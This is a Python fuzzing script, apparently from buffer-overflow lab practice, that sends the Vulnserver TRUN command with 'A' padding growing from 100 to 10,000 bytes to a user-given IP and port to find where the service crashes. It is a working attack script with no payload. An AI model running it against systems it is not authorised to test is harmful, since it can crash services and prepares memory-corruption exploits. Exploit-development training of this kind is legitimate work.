#!/usr/bin/python3

import sys,socket
from time import sleep

print("**************VULNSERVER- TRUN *************")
sleep(0.5)
ip_address=input("ENter the IP address\n")
port_number=input("Enter the port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP address field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port_number)>0):
    buffer=100
    while(buffer<=10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print(f"Sending buffer --> {buffer}")
        s.connect((ip_address, int(port_number)))
        s.send((b"TRUN /.:/" + b"A" * buffer))
        s.close()
        buffer=buffer+200
        sleep(1)
